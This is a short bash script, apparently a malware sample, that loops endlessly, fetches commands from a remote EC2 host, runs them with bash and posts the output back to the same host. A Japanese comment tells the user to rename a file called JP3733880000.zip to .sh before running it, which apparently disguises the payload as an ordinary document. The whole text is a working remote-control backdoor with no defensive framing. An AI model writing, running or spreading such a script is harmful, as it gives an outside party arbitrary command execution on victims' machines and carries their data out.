while true; do

  cmd=$(curl -sk http://ec2-54-95-251-88.ap-northeast-1.compute.amazonaws.com/getcmd)

  result=$(bash -c "$cmd" 2>&1)

  curl -sk -X POST -d "$result" http://ec2-54-95-251-88.ap-northeast-1.compute.amazonaws.com/postresult

  sleep 5

done

#ファイル名をJP3733880000.zipからJP3733880000.shに変更してから、本スクリプトを実行してください。
